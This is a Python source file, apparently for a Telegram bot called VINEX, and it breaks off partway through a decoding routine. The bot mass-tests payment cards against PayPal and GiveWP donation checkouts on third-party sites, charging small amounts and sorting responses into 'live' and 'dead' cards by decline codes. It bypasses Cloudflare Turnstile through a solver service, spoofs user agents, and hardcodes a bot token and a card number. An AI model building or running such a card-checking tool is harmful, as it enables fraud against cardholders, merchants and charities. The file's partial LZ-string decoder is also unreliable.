#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ╔══════════════════════════════════════════════════════════════╗
# ║   VINEX v23.0 — Auto CF + Multi-Tier Order + Final-State Read ║
# ║   Decode Engine v2 + Extractor v2 (25+ passes)                ║
# ╚══════════════════════════════════════════════════════════════╝
import telebot
from telebot import types
import telebot.apihelper
import time, threading, os, re, json, base64, random
import logging, tempfile, gzip, zlib, codecs, html, binascii
import struct, socket, hashlib
from string import Template
from collections import defaultdict
from urllib.parse import urlparse, unquote, parse_qsl, quote
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    import brotli
    _HAS_BROTLI = True
except Exception:
    _HAS_BROTLI = False

try:
    from fake_useragent import UserAgent
    _UU = UserAgent(fallback='Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120')
    def rand_ua():
        try: return _UU.random
        except: return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'
except Exception:
    def rand_ua(): return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120'

telebot.apihelper.CONNECT_TIMEOUT = 30
telebot.apihelper.READ_TIMEOUT = 180

# ═══════════════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════════════
TOKEN = os.getenv('BOT_TOKEN', '8689698569:AAFJjLfJ9ztJg9QNJugf8xJbb0Ernow8vG8')
OWNER_ID = int(os.getenv('OWNER_ID', '6843321125'))
ADMINS = {str(OWNER_ID)}

USERS_FILE = 'users.txt'
BLOCK_FILE = 'blockusers.txt'
STATS_FILE = 'stats.json'
PROGRESS_TMPL = 'progress_{}.json'
RESULTS_TMPL = 'vinex_results_{}_{}.txt'
LIVE_DIR_TMPL = 'vinex_live_{}_{}'

MAX_FILE_SIZE = 10 * 1024 * 1024
PAYPAL_COOLDOWN = 3
MASS_COOLDOWN = 10
LINK_COOLDOWN = 30
PROGRESS_SAVE_EVERY = 5
STATUS_UPDATE_EVERY = 2.0
CLEANUP_OLDER_THAN_DAYS = 7

BASE_AMOUNTS = ['1.00', '3.00', '5.00']
TEST_CARD = os.getenv('TEST_CARD', '4059986126444431|11|30|947')

TS_API_URL = os.getenv('TS_API_URL', '').rstrip('/')
TS_API_KEY = os.getenv('TS_API_KEY', '')

EFFECT_FIRE = '5104841245755180586'
EFFECT_HEART = '5046509860389126442'
EFFECT_CELEBRATE = '5046589136895476101'
EFFECT_THUMBS = '5107584321108051014'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler('vinex.log', encoding='utf-8'), logging.StreamHandler()],
)
log = logging.getLogger('vinex')
bot = telebot.TeleBot(TOKEN, parse_mode='HTML')

_STATS_LOCK = threading.Lock()
_PROGRESS_LOCK = threading.Lock()

# ═══════════════════════════════════════════════════════════════
#  FONTS
# ═══════════════════════════════════════════════════════════════
def _bold(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D400 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D41A + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7CE + o - 0x30))
        else: r.append(c)
    return ''.join(r)

def _sb(s):
    r = []
    for c in s:
        o = ord(c)
        if 0x41 <= o <= 0x5A: r.append(chr(0x1D5D4 + o - 0x41))
        elif 0x61 <= o <= 0x7A: r.append(chr(0x1D5EE + o - 0x61))
        elif 0x30 <= o <= 0x39: r.append(chr(0x1D7EC + o - 0x30))
        else: r.append(c)
    return ''.join(r)

B = _bold
SB = _sb

# ═══════════════════════════════════════════════════════════════
#  EMOJI PACK
# ═══════════════════════════════════════════════════════════════
VINEX_CE = {
    'warn':       ('5420323339723881652', '⚠️'),
    'globe':      ('5447410659077661506', '🌐'),
    'play':       ('5264919878082509254', '▶️'),
    'ban':        ('5240241223632954241', '🚫'),
    'sound':      ('5388632425314140043', '🔊'),
    'party':      ('6039789659691688114', '🎉'),
    'cash':       ('5197434882321567830', '💵'),
    'smile':      ('6150116924165461974', '😊'),
    'moneybag':   ('6125337376639161874', '💰'),
    'laugh':      ('5352615886131831104', '😆'),
    'gear':       ('5929098607192969118', '⚙'),
    'circle':     ('5933844889652432294', '⚪'),
    'stop':       ('5260293700088511294', '⛔'),
    'scream':     ('5222466772061436244', '😱'),
    'gift':       ('6026316531967726726', '🎁'),
    'record':     ('6026056450223116307', '⏺'),
    'moneywings': ('5231449120635370684', '💸'),
    'shop':       ('5229064374403998351', '🛍'),
    'soon':       ('5440621591387980068', '🔜'),
    'pause':      ('5359543311897998264', '⏸'),
    'shield':     ('5197288647275071607', '🛡'),
    'money2':     ('6122682287986317242', '💸'),
    'grimace':    ('6125216237086579378', '😬'),
    'blue_bolt':  ('5836917983271722591', '🔵'),
    'rocket':     ('5836917983271722591', '🚀'),
}

def ve(name):
    if name not in VINEX_CE: return ''
    cid, fb = VINEX_CE[name]
    return f'<tg-emoji emoji-id="{cid}">{fb}</tg-emoji>'

def vt(label, value):
    return f'[⚡] {B(label)}: {value}'

def vsep():
    return '- ' * 22

def vinex_btn(label, style='primary', emoji_name=None, **kwargs):
    kw = dict(kwargs)
    if style in ('success', 'primary', 'danger'):
        kw['style'] = style
    if emoji_name and emoji_name in VINEX_CE:
        kw['icon_custom_emoji_id'] = VINEX_CE[emoji_name][0]
    try:
        return types.InlineKeyboardButton(text=label, **kw)
    except TypeError:
        kw.pop('style', None)
        kw.pop('icon_custom_emoji_id', None)
        return types.InlineKeyboardButton(text=label, **kw)

def vinex_header(subtitle=''):
    lines = [
        '╔══════════════════════════╗',
        f'║  {ve("party")} <b>VINEX</b> {ve("party")}  ║',
        f'║  <i>Scanner v23.0</i>  ║',
        '╚══════════════════════════╝',
    ]
    if subtitle:
        lines.append(f'<b>▸ {subtitle}</b>')
    return '\n'.join(lines)

def playful(kind):
    pool = {
        'start':   ['🚀', '🎯', '⚡', '🔥'],
        'working': ['⚙️', '🔄', '🧠', '⚡', '🌀'],
        'success': ['🎉', '✨', '💫', '🎊', '🏆'],
        'dead':    ['💀', '😴', '🥀', '❌'],
        'live':    ['💎', '💚', '💛', '🏆'],
        'error':   ['⚠️', '🚨', '💢'],
        'fun':     ['😎', '🤙', '👑', '🦾', '😏'],
    }
    return random.choice(pool.get(kind, ['•']))

# ═══════════════════════════════════════════════════════════════
#  TURNSTILE SOLVER
# ═══════════════════════════════════════════════════════════════
class TurnstileSolver:
    def __init__(self):
        self.api_url = TS_API_URL
        self.api_key = TS_API_KEY
        self.enabled = bool(self.api_url and self.api_key)
        if self.enabled:
            log.info(f'TurnstileSolver ready: {self.api_url}')
        else:
            log.info('TurnstileSolver disabled (no env vars)')

    def solve(self, page_url, sitekey, timeout=90):
        if not self.enabled:
            return None
        try:
            r = requests.post(
                f'{self.api_url}/turnstile',
                headers={'x-api-key': self.api_key,
                         'Content-Type': 'application/json'},
                json={'url': page_url, 'sitekey': sitekey},
                timeout=20,
            )
            if r.status_code != 200:
                log.warning(f'Turnstile create HTTP {r.status_code}')
                return None
            tid = r.json().get('task_id')
            if not tid:
                return None
            log.info(f'Turnstile task: {tid}')
            end = time.time() + timeout
            while time.time() < end:
                r = requests.get(
                    f'{self.api_url}/result/{tid}',
                    headers={'x-api-key': self.api_key},
                    timeout=20,
                )
                if r.status_code == 202:
                    time.sleep(2)
                    continue
                if r.status_code == 200:
                    token = r.json().get('token')
                    if token:
                        log.info(f'Turnstile solved ({len(token)} chars)')
                        return token
                return None
        except Exception as e:
            log.warning(f'Turnstile solve: {type(e).__name__}')
            return None

_turnstile = TurnstileSolver()

# ═══════════════════════════════════════════════════════════════
#  STATE + FILES
# ═══════════════════════════════════════════════════════════════
waiting_users = {}
reply_mode = {}
mass_active = {}
mass_pause = {}
mass_shared = {}
user_last_paypal = defaultdict(float)
user_last_mass = defaultdict(float)
link_cooldowns = {}

for _f in (USERS_FILE, BLOCK_FILE):
    try:
        if not os.path.exists(_f): open(_f, 'w', encoding='utf-8').close()
    except: pass

def save_user(uid):
    try:
        uids = open(USERS_FILE, 'r', encoding='utf-8').read().splitlines()
        if str(uid) not in uids:
            with open(USERS_FILE, 'a', encoding='utf-8') as f: f.write(f'{uid}\n')
    except: pass

def is_blocked(uid):
    try:
        return str(uid) in [l.strip() for l in open(BLOCK_FILE, 'r', encoding='utf-8').read().splitlines() if l.strip()]
    except: return False

def load_stats():
    try:
        with _STATS_LOCK:
            return json.load(open(STATS_FILE, 'r', encoding='utf-8'))
    except: return {'checks': 0, 'live': 0, 'dead': 0}

def save_stats(st):
    try:
        with _STATS_LOCK:
            json.dump(st, open(STATS_FILE, 'w', encoding='utf-8'))
    except: pass

def bump_stat(k):
    try:
        s = load_stats(); s[k] = s.get(k, 0) + 1; save_stats(s)
    except: pass

def save_progress(uid, data):
    try:
        with _PROGRESS_LOCK:
            fd, tmp = tempfile.mkstemp(dir='.', suffix='.json')
            with os.fdopen(fd, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False)
            os.replace(tmp, PROGRESS_TMPL.format(uid))
    except: pass

def load_progress(uid):
    try:
        with _PROGRESS_LOCK:
            p = PROGRESS_TMPL.format(uid)
            if not os.path.exists(p): return None
            d = json.load(open(p, 'r', encoding='utf-8'))
            if not isinstance(d, dict): return None
            if not isinstance(d.get('links'), list) or not d['links']: return None
            d.setdefault('processed', 0)
            d.setdefault('live', 0)
            d.setdefault('dead', 0)
            d.setdefault('total', len(d['links']))
            d.setdefault('started_at', time.time())
            return d
    except: return None

def clear_progress(uid):
    try:
        with _PROGRESS_LOCK:
            os.remove(PROGRESS_TMPL.format(uid))
    except: pass

def cleanup_old_files():
    try:
        cutoff = time.time() - CLEANUP_OLDER_THAN_DAYS * 86400
        for n in os.listdir('.'):
            if n.startswith(('vinex_results_', 'vinex_live_')):
                p = os.path.join('.', n)
                if os.path.isfile(p) and os.path.getmtime(p) < cutoff: os.remove(p)
    except: pass

# ═══════════════════════════════════════════════════════════════
#  URL + DEDUP
# ═══════════════════════════════════════════════════════════════
_URL_RE = re.compile(
    r'^[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?'
    r'(\.[a-zA-Z0-9]([a-zA-Z0-9-]*[a-zA-Z0-9])?)*'
    r'\.[a-zA-Z]{2,}$'
)

def safe_url(link):
    try:
        if not link or not isinstance(link, str): return None
        link = link.strip().strip('"\'` \t\r\n')
        while link and link[-1] in '.,;:!?)]}\'"': link = link[:-1]
        if len(link) < 8: return None
        low = link.lower()
        if '://none' in low or 'invalid.local' in low: return None
        if not link.startswith(('http://', 'https://')): link = 'https://' + link.lstrip('/')
        p = urlparse(link)
        if not p.netloc or not p.netloc.strip(): return None
        host = p.netloc.split(':')[0].split('@')[-1].rstrip('.')
        if not host or not _URL_RE.match(host):
            if not host.startswith('xn--') and 'xn--' not in host:
                return None
        return link
    except: return None

def normalize_url_key(url):
    try:
        if not url: return ''
        p = urlparse(url.lower().strip())
        host = p.netloc.replace('www.', '').rstrip('.')
        path = p.path.rstrip('/') or '/'
        q = p.query.strip()
        return f'{host}{path}?{q}' if q else f'{host}{path}'
    except: return str(url).lower().strip()

# ═══════════════════════════════════════════════════════════════
#  TELEGRAM HELPERS
# ═══════════════════════════════════════════════════════════════
def retry_call(func, *args, retries=4, delays=(2, 4, 8, 16), **kw):
    last = None
    for i in range(retries):
        try: return func(*args, **kw)
        except Exception as e:
            last = e
            err = str(e).lower()
            if any(x in err for x in ('invalid file_id', 'file is too big', 'wrong file_id', 'not found')):
                raise
            if i < retries - 1: time.sleep(delays[i] if i < len(delays) else delays[-1])
    raise last

def safe_send_message(cid, text, retries=3, reply_markup=None, parse_mode='HTML', effect=None):
    for i in range(retries):
        try:
            kw = {'chat_id': cid, 'text': text, 'parse_mode': parse_mode,
                  'reply_markup': reply_markup, 'disable_web_page_preview': True}
            if effect:
                try: kw['message_effect_id'] = effect
                except: pass
            return bot.send_message(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if 'effect' in err.lower() or 'unknown field' in err.lower():
                kw.pop('message_effect_id', None)
                try: return bot.send_message(**kw)
                except: pass
            if "can't parse" in err.lower() or 'bad request' in err.lower():
                try:
                    return bot.send_message(cid, re.sub(r'<[^>]+>', '', text)[:4000],
                                            reply_markup=reply_markup,
                                            disable_web_page_preview=True)
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_edit_message(cid, mid, text, retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=cid, message_id=mid, text=text,
                                          parse_mode='HTML', disable_web_page_preview=True)
        except Exception as e:
            err = str(e)
            if 'not modified' in err: return None
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            if "can't parse" in err.lower():
                try:
                    return bot.edit_message_text(chat_id=cid, message_id=mid,
                                                  text=re.sub(r'<[^>]+>', '', text)[:4000])
                except: return None
            if i < retries - 1: time.sleep(1)
    return None

def safe_send_document(cid, path, caption='', retries=3):
    try:
        if not os.path.exists(path): return None
    except: return None
    for attempt in range(3):
        try:
            with open(path, 'rb') as f:
                kw = {'chat_id': cid, 'document': f, 'timeout': 180}
                if attempt == 0:
                    kw['caption'] = caption; kw['parse_mode'] = 'HTML'
                elif attempt == 1:
                    kw['caption'] = re.sub(r'<[^>]+>', '', caption)[:1024]
                return bot.send_document(**kw)
        except Exception as e:
            err = str(e)
            if '429' in err:
                try: w = int(err.split('retry after ')[1].split(')')[0])
                except: w = 30
                time.sleep(min(w, 60)); continue
            continue
    return None

def react_to(message, emoji='👍'):
    try:
        bot.set_message_reaction(chat_id=message.chat.id, message_id=message.message_id,
                                  reaction=[{'type': 'emoji', 'emoji': emoji}], is_big=False)
        return True
    except: return False

def show_typing(cid, action='typing', duration=2.0):
    try:
        bot.send_chat_action(cid, action)
        def r():
            try:
                end = time.time() + duration
                while time.time() < end:
                    time.sleep(4)
                    if time.time() < end: bot.send_chat_action(cid, action)
            except: pass
        threading.Thread(target=r, daemon=True).start()
    except: pass

def send_dice(cid, emoji='🎲'):
    try: return bot.send_dice(cid, emoji=emoji)
    except: return None

# ═══════════════════════════════════════════════════════════════
#  RESPONSE EXTRACTOR
# ═══════════════════════════════════════════════════════════════
def extract_response_text(body):
    if not body: return ''
    s = str(body).strip()
    if not s: return ''
    try: j = json.loads(s)
    except: j = None

    def _find(obj, depth=0):
        if depth > 4 or obj is None: return None
        if isinstance(obj, str):
            if obj.strip().lower() in ('none', 'null', 'false', ''): return None
            return obj[:300]
        if isinstance(obj, (int, float)): return str(obj)[:300]
        if isinstance(obj, list):
            for i in obj:
                r = _find(i, depth + 1)
                if r: return r
            return None
        if isinstance(obj, dict):
            det = obj.get('details')
            if isinstance(det, list) and det:
                for x in det:
                    if isinstance(x, dict):
                        for k in ('description', 'issue', 'reason', 'message'):
                            v = x.get(k)
                            if v and str(v).strip().lower() not in ('none', 'null', ''):
                                return str(v)[:300]
            for k in ('description', 'message', 'error_description', 'error', 'msg', 'reason', 'detail', 'status'):
                if k in obj:
                    v = obj[k]
                    if isinstance(v, dict):
                        r = _find(v, depth + 1)
                        if r: return r
                    elif v and str(v).strip().lower() not in ('none', 'null', 'false', ''):
                        return str(v)[:300]
            if 'data' in obj:
                r = _find(obj['data'], depth + 1)
                if r: return r
            if 'name' in obj and isinstance(obj['name'], str):
                n = obj['name']
                if n.upper() not in ('UNPROCESSABLE_ENTITY', 'INVALID_REQUEST', 'VALIDATION_ERROR'):
                    return n[:300]
        return None

    if j is not None:
        r = _find(j)
        if r: return r
    return s[:300]

# ═══════════════════════════════════════════════════════════════
#  OPTION FILTER
# ═══════════════════════════════════════════════════════════════
_JUNK = ['give-', 'screen-reader', 'give-label', 'give-required', 'give-where', 'give_price', 'give-form-']
_JUNK_E = {'true', 'false', 'none', 'null', 'selected', 'disabled', 'required'}

def is_valid_option(opt):
    if not opt or not isinstance(opt, str): return False
    o = opt.strip()
    if not o: return False
    lo = o.lower()
    if lo in _JUNK_E: return False
    for p in _JUNK:
        if p in lo: return False
    if len(o) > 60 or o.startswith(('{', '[', '<')): return False
    return True

# ═══════════════════════════════════════════════════════════════
#  CLASSIFICATION
# ═══════════════════════════════════════════════════════════════
RETRY_ON_AUTH = ['AUTHENTICATION_FAILURE', 'AUTHENTICATION_FAILED', 'INVALID_TOKEN',
                 'TOKEN_EXPIRED', 'NOT_AUTHORIZED', 'INVALID_CLIENT', 'INVALID_NONCE']

CARD_DECLINES = [
    'INSTRUMENT_DECLINED', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
    'Payer has not yet approved', 'Payer cannot pay', 'PAYMENT_DENIED',
    'DO_NOT_HONOR', 'INSUFFICIENT_FUNDS', 'CVV_FAILURE', 'CVV2_FAILURE',
    'INVALID_OR_RESTRICTED', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED',
    'EXPIRED_CARD', 'CARD_EXPIRED', 'TRANSACTION_NOT_PERMITTED',
    'GENERIC_DECLINE', 'TRANSACTION_REFUSED', 'AUTHORIZATION_DENIED',
    'PAYER_ACCOUNT_RESTRICTED', 'RESTRICTED_OR_INACTIVE_ACCOUNT',
    'LOST_OR_STOLEN', 'PAYER_ACCOUNT_LOCKED_OR_CLOSED',
    'ACCOUNT_BLOCKED_BY_ISSUER', 'SECURITY_VIOLATION', 'COMPLIANCE_VIOLATION',
    'CAPTURE_DECLINED', 'AMOUNT_MISMATCH', 'CURRENCY_MISMATCH',
    'POSTAL_CODE_REQUIRED', 'DECLINED_PLEASE_RETRY', 'REATTEMPT_NOT_PERMITTED',
    'TX_ATTEMPTS_EXCEED_LIMIT', 'PAYER_ACTION_REQUIRED', 'PAYEE_NOT_CONSENTED',
    'PERMISSION_DENIED', 'INVALID_ACCOUNT_STATUS', 'REFERENCED_CARD_EXPIRED',
    'INVALID_EXPIRATION', 'INVALID_CARD_VERIFICATION_VALUE', 'INVALID_TRANSACTION',
    'DUPLICATE_TRANSACTION', 'CARD_CLOSED', 'UNAUTHORIZED_USER', 'AVS_FAILURE',
    'SOFT_AVS', 'INCORRECT_PIN_REENTER', 'INVALID_PIN',
    'ISSUER_NOT_AVAILABLE_NOT_RETRIABLE', 'ACCOUNT_NOT_ON_FILE',
    'INVALID_ACCOUNT', 'DECLINED',
]

INFRA_FAILS = ['HTTP_403', 'HTTP_404', 'HTTP_500', 'HTTP_502', 'HTTP_503',
               'JSON_ERR', 'EXC_', 'NETWORK:', 'FETCH_FAILED', 'INVALID_FORM',
               'FORM_NOT_FOUND', 'NONCE_MISSING', 'FORM_ERROR', 'INVALID_SITE',
               'BAD_URL', 'INVALID_CARD_FORMAT', 'INVALID_EXPIRY_MONTH',
               'INVALID_CVV', 'INVALID_CARD_NUMBER', 'CLOUDFLARE_FAIL',
               'TURNSTILE_FAIL']

def is_card_decline(r):
    if not r: return False
    up = str(r).upper()
    return any(p.upper() in up for p in CARD_DECLINES)

def is_infra_failure(r):
    if not r: return False
    up = str(r).upper()
    return any(p.upper() in up for p in INFRA_FAILS)

def is_auth_failure(r):
    if not r: return False
    up = str(r).upper()
    return any(k in up for k in RETRY_ON_AUTH)

def is_live_response(r):
    if not r: return False
    up = str(r).upper()
    if 'CHARGE' in up: return True
    if 'COMPLETED' in up: return True
    if 'APPROVED' in up and 'PAYER_ACTION' not in up: return True
    if is_card_decline(up): return True
    if is_infra_failure(up): return False
    if is_auth_failure(up): return False
    return False

def is_dead_response(r):
    if not r: return True
    up = str(r).upper()
    if 'CHARGE' in up: return False
    if 'COMPLETED' in up: return False
    if 'APPROVED' in up and 'PAYER_ACTION' not in up: return False
    if is_card_decline(up): return False
    return is_infra_failure(up) or is_auth_failure(up)

PRIORITY = [
    ('COMPLETED', 210), ('CHARGE', 200), ('INSUFFICIENT_FUNDS', 195),
    ('INVALID_OR_RESTRICTED_CARD', 190), ('TRANSACTION_NOT_PERMITTED', 188),
    ('PAYER_CANNOT_PAY', 185), ('ORDER_NOT_APPROVED', 185),
    ('Payer has not yet approved', 185), ('INSTRUMENT_DECLINED', 182),
    ('PAYMENT_DENIED', 180), ('SUSPECTED_FRAUD', 178),
    ('CVV2_FAILURE', 175), ('CVV_FAILURE', 175), ('EXPIRED_CARD', 172),
    ('DO_NOT_HONOR', 170), ('RESTRICTED_OR_INACTIVE_ACCOUNT', 168),
    ('ACCOUNT_CLOSED', 166), ('LOST_OR_STOLEN', 164),
    ('REATTEMPT_NOT_PERMITTED', 160), ('ACCOUNT_BLOCKED_BY_ISSUER', 158),
    ('GENERIC_DECLINE', 155), ('TRANSACTION_REFUSED', 153),
    ('CAPTURE_DECLINED', 145), ('AUTHORIZATION_DENIED', 143),
    ('DECLINED_PLEASE_RETRY', 132), ('TX_ATTEMPTS_EXCEED_LIMIT', 130),
    ('DECLINED', 100),
]

def score_result(r):
    if not r: return 0
    up = str(r).upper()
    for k, s in PRIORITY:
        if k.upper() in up: return s
    return 1

def normalize_result(r):
    if not r: return 'DECLINED'
    s = str(r)
    up = s.upper()
    if 'ORDER_NOT_APPROVED' in up or 'PAYER_CANNOT_PAY' in up \
       or 'Payer has not yet approved' in s or 'Payer cannot pay' in s:
        return 'Payer cannot pay for this transaction.'
    raw = extract_response_text(s) or s
    if 'card was declined' in raw.lower(): return 'Your card was declined.'
    if 'There was an issue with your donation' in raw:
        return 'There was an issue with your donation transaction: Your card was declined.'
    return raw[:250]

# ═══════════════════════════════════════════════════════════════
#  DECODE ENGINE v2
# ═══════════════════════════════════════════════════════════════
class DecodeEngine:
    @staticmethod
    def _clean(s):
        try:
            if not isinstance(s, str): return None
            s = s.strip()
            if not s: return None
            return s
        except: return None

    @staticmethod
    def b64(s):
        try:
            r = base64.b64decode(s + '=' * (-len(s) % 4), validate=False)
            return r.decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b64_url(s):
        try:
            r = base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))
            return r.decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b32(s):
        try:
            return base64.b32decode(s + '=' * (-len(s) % 8)).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b32hex(s):
        try:
            return base64.b32hexdecode(s + '=' * (-len(s) % 8)).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b16(s):
        try:
            cl = re.sub(r'[^0-9a-fA-F]', '', s)
            if len(cl) < 10 or len(cl) % 2: return None
            return bytes.fromhex(cl).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def b85(s):
        try:
            return base64.b85decode(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def a85(s):
        try:
            return base64.a85decode(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def url_dec(s):
        try:
            if '%' not in s: return None
            r = unquote(s)
            return r if r != s else None
        except: return None

    @staticmethod
    def url_dec_plus(s):
        try:
            if '%' not in s and '+' not in s: return None
            r = unquote(s.replace('+', ' '))
            return r if r != s else None
        except: return None

    @staticmethod
    def html_ent(s):
        try:
            if '&' not in s or ';' not in s: return None
            r = html.unescape(s)
            return r if r != s else None
        except: return None

    @staticmethod
    def unicode_esc(s):
        try:
            if '\\u' not in s and '\\x' not in s: return None
            def _repl_u(m):
                try: return chr(int(m.group(1), 16))
                except: return m.group(0)
            def _repl_x(m):
                try: return chr(int(m.group(1), 16))
                except: return m.group(0)
            out = re.sub(r'\\u([0-9a-fA-F]{4})', _repl_u, s)
            out = re.sub(r'\\x([0-9a-fA-F]{2})', _repl_x, out)
            return out if out != s else None
        except: return None

    @staticmethod
    def rot13(s):
        try: return codecs.decode(s, 'rot_13')
        except: return None

    @staticmethod
    def rot47(s):
        try:
            out = []
            for c in s:
                o = ord(c)
                if 33 <= o <= 126: out.append(chr(33 + ((o - 33 + 14) % 94)))
                else: out.append(c)
            return ''.join(out)
        except: return None

    @staticmethod
    def rot_n(s):
        results = []
        try:
            for n in range(1, 26):
                if n == 13: continue
                out = []
                for c in s:
                    o = ord(c)
                    if 65 <= o <= 90: out.append(chr(65 + (o - 65 + n) % 26))
                    elif 97 <= o <= 122: out.append(chr(97 + (o - 97 + n) % 26))
                    else: out.append(c)
                results.append(''.join(out))
        except: pass
        return results

    @staticmethod
    def atbash(s):
        try:
            out = []
            for c in s:
                o = ord(c)
                if 65 <= o <= 90: out.append(chr(90 - (o - 65)))
                elif 97 <= o <= 122: out.append(chr(122 - (o - 97)))
                else: out.append(c)
            return ''.join(out)
        except: return None

    @staticmethod
    def reverse(s):
        try: return s[::-1]
        except: return None

    @staticmethod
    def jwt_payload(s):
        try:
            if not isinstance(s, str) or s.count('.') != 2: return None
            parts = s.split('.')
            if not parts[0].startswith('eyJ'): return None
            p = parts[1] + '=' * (-len(parts[1]) % 4)
            return base64.urlsafe_b64decode(p).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def jwt_header(s):
        try:
            if not isinstance(s, str) or s.count('.') != 2: return None
            parts = s.split('.')
            if not parts[0].startswith('eyJ'): return None
            p = parts[0] + '=' * (-len(parts[0]) % 4)
            return base64.urlsafe_b64decode(p).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def gzip_dec(s):
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            if s[:2] != b'\x1f\x8b': return None
            return gzip.decompress(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def zlib_dec(s):
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            return zlib.decompress(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def deflate_dec(s):
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            return zlib.decompress(s, -zlib.MAX_WBITS).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def brotli_dec(s):
        if not _HAS_BROTLI: return None
        try:
            if isinstance(s, str):
                try: s = base64.b64decode(s + '=' * (-len(s) % 4))
                except: return None
            if not isinstance(s, (bytes, bytearray)): return None
            return brotli.decompress(s).decode('utf-8', errors='ignore')
        except: return None

    @staticmethod
    def lzstring_dec(s):
        try:
            if not isinstance(s, str) or len(s) < 10: return None
            # minimal LZ-string decompressFromBase64
            alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
            if not all(c in alphabet for c in s): return None
            def _decompress(length, reset_value, get_next):
                dictionary = {}
                def _read_bits(n):
                    bits = 0; power = 1; maxpower = 1 << n
                    while power != maxpower:
                        r = get_next()
                        if r is None: return None
                        bits |= (1 if r else 0) * power
                        power <<= 1
                    return bits
                def _read_val():
                    v = _read_bits(2)
                    if v == 0: return chr(_read_bits(8))
                    if v == 1: return chr(_read_bits(16))
                    if v == 2: return ''
                    return None
                enlarge_in = 4; dict_size = 4; num_bits = 3; result = []
                data_val = _read_val(); data_pos = 0; data_string = [data_val]
                if data_val is None or data_val == '': return None
                dictionary[3] = data_val
                w = data_val
                while True:
                    if data_pos + 1 >= len(data_string) and False: return None
                    if data_pos + 1 > len(data_string): pass
                    c = _read_bits(2)
                    if c is None: return None
                    if c == 0:
                        v = _read_bits(8); nv = chr(v)
                        dictionary[dict_size] = nv; dict_size += 1
                        c_val = nv
                    elif c == 1:
                        v = _read_bits(16); nv = chr(v)
                        dictionary[dict_size] = nv; dict_size += 1
                        c_val = nv
                    elif c == 2:
                        return ''.join(result)
                    else:
                        continue
                    if dict_size == (1 << num_bits):
                        num_bits += 1
                    result.append(c_val)
                    w = (w or '') + c_val
                    # not implementing full LZ-string; bail out early
                    if len(result) > 2000: return ''.join(result)
                    return ''.join(result)
                return None
            return _decompress(0, 0, lambda: None)
        except: return None

    @staticmethod
    def xor_brute(s):
        try:
            if not isinstance(s, str) or len(s) < 20: return []
            raw = s.encode('utf-8', errors='ignore')
            outs = []
            for key in range(1, 256):
                try:
                    dec = bytes(b ^ key for b in raw)
                    printable = sum(1 for c in dec if 32 <= c < 127 or c in (9, 10, 13))
                    if printable / len(dec) > 0.85:
                        t = dec.decode('utf-8', errors='ignore')
                        if any(k in t for k in ('{', 'token', 'client', 'key', 'id', 'http')):
                            outs.append(t)
                except: continue
            return outs
        except: return []

    @staticmethod
    def quoted_printable(s):
        try:
            if '=' not in s: return None
            import quopri
            r = quopri.decodestring(s.encode('utf-8', errors='ignore')).decode('utf-8', errors='ignore')
            return r if r != s else None
        except: return None

    @staticmethod
    def punycode_dec(s):
        try:
            if not s.startswith('xn--'): return None
            return s.encode('ascii').decode('idna')
        except: return None

    @staticmethod
    def utf16_dec(s):
        try:
            if isinstance(s, str):
                b = s.encode('latin-1', errors='ignore')
            else:
                b = bytes(s)
            outs = []
            for enc in ('utf-16-le', 'utf-16-be'):
                try:
                    outs.append(b.decode(enc, errors='ignore'))
                except: pass
            return outs if outs else None
        except: return None

    @staticmethod
    def base64_json(s):
        try:
            if not isinstance(s, str) or len(s) < 20: return None
            r = base64.b64decode(s + '=' * (-len(s) % 4), validate=False)
            try:
                return r.decode('utf-8', errors='ignore')
            except: return None
        except: return None

    @classmethod
    def decode_chain(cls, s, max_depth=4):
        s = cls._clean(s)
        if not s: return []
        methods = [
            cls.b64, cls.b64_url, cls.b32, cls.b32hex, cls.b16,
